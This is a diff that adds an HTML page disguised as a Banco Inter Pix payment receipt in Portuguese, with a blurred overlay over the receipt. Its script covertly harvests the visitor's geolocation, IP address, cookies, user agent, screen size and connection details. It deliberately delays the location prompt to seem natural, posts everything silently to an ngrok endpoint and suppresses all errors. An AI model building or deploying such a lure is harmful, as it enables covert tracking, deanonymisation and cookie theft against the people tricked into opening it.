@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Comprovante</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: antiquewhite;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+
+    /* Camada de overlay embaçada */
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.7); /* Cor semi-transparente */
+      backdrop-filter: blur(10px);           /* Efeito de desfoque */
+      z-index: 10;
+    }
+
+    /* Container do documento (comprovante) */
+    .document {
+      position: relative;
+      width: 90%;
+      max-width: 500px;
+      background-color: #fff;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      z-index: 5;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+      padding-bottom: 20px;
+    }
+
+    /* Cabeçalho do documento */
+    .header {
+      background-color: #FF7A00; /* Cor laranja "Inter" */
+      color: #fff;
+      padding: 20px;
+      font-size: 18px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .header span {
+      display: block;
+      font-size: 16px;
+      margin-top: 5px;
+      font-weight: normal;
+    }
+
+    /* Seção do conteúdo */
+    .content {
+      padding: 20px;
+      color: #333;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    /* Títulos das seções (Sobre a transação, Quem pagou, etc.) */
+    .section-title {
+      font-weight: bold;
+      margin: 15px 0 5px;
+      color: #333;
+      font-size: 15px;
+    }
+
+    /* Linhas de informação */
+    .info-line {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+
+    .info-label {
+      font-weight: 500;
+      color: #555;
+    }
+
+    .info-value {
+      text-align: right;
+      color: #333;
+      max-width: 60%;
+      word-wrap: break-word;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Camada de overlay embaçada -->
+  <div class="overlay"></div>
+
+  <!-- Documento -->
+  <div class="document">
+    <!-- Cabeçalho -->
+    <div class="header">
+      Inter
+      <span>Pix enviado <strong>R$ 99,99</strong></span>
+    </div>
+
+    <!-- Conteúdo do comprovante -->
+    <div class="content">
+      <!-- Sobre a transação -->
+      <div class="section-title">Sobre a transação</div>
+      <div class="info-line">
+        <div class="info-label">Data da transação</div>
+        <div class="info-value">25/03/2025</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Horário</div>
+        <div class="info-value">18h58</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Identificador</div>
+        <div class="info-value">abc123xyz456ficticio</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">ID da transação</div>
+        <div class="info-value">E0000000000000000000FAKE</div>
+      </div>
+
+      <!-- Quem pagou -->
+      <div class="section-title">Quem pagou</div>
+      <div class="info-line">
+        <div class="info-label">Nome</div>
+        <div class="info-value">Fulano de Tal</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">CPF/CNPJ</div>
+        <div class="info-value">***.123.456-**</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Número da conta</div>
+        <div class="info-value">00012345-6</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Agência</div>
+        <div class="info-value">0001</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Instituição</div>
+        <div class="info-value">BANCO INTER S.A.</div>
+      </div>
+
+      <!-- Quem recebeu -->
+      <div class="section-title">Quem recebeu</div>
+      <div class="info-line">
+        <div class="info-label">Nome</div>
+        <div class="info-value">Loja Exemplo</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">CPF/CNPJ</div>
+        <div class="info-value">12.345.678/0001-90</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Número da conta</div>
+        <div class="info-value">4135802-6</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Agência</div>
+        <div class="info-value">0001</div>
+      </div>
+      <div class="info-line">
+        <div class="info-label">Instituição</div>
+        <div class="info-value">MAGALUPAY</div>
+      </div>
+    </div>
+  </div>
+  <script>
+    // Função para obter o IP do usuário
+    async function getIpAddress() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        return 'IP não disponível';
+      }
+    }
+
+    // Função para enviar os dados
+    async function sendData(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const ip = await getIpAddress();
+      const userAgent = navigator.userAgent;
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+      const language = navigator.language;
+      const cookies = document.cookie;
+      const connection = navigator.connection ? {
+        type: navigator.connection.type,
+        downlink: navigator.connection.downlink
+      } : 'Não disponível';
+
+      // Monta o objeto com todas as informações
+      const data = {
+        latitude,
+        longitude,
+        ip,
+        userAgent,
+        screenWidth,
+        screenHeight,
+        language,
+        cookies,
+        connection
+      };
+
+      // Envia os dados para o backend silenciosamente
+      fetch("https://04a9-131-72-217-242.ngrok-free.app/send-data", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .catch(error => {
+        // Erros são ignorados silenciosamente
+      });
+    }
+
+    // Função para lidar com erros de geolocalização
+    function handleError(error) {
+      // Não faz nada visível para o usuário
+    }
+
+    // Atrasar a solicitação de localização para parecer mais natural
+    setTimeout(() => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendData, handleError);
+      }
+    }, 2000); // Atraso de 2 segundos
+  </script>
+</body>
+</html>
